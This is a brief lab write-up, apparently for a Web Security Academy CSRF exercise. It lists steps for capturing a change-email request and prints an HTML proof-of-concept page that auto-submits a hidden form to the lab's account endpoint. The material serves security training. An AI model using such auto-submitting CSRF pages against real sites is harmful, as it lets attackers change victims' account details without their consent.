```bash
1. login: wiener user
2. press all the continue button  --  then: My account  --  update email
3. send this request to the repeater
4. again no CSRF protection
5. generate CSRF PoC  --  update the email value

CSRF PAYLOAD

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="apple@mail.com">
			<input type="submit" value="Submit Request">
		</form>
	</body>
	<script>document.forms[0].submit();</script>
</html>


```
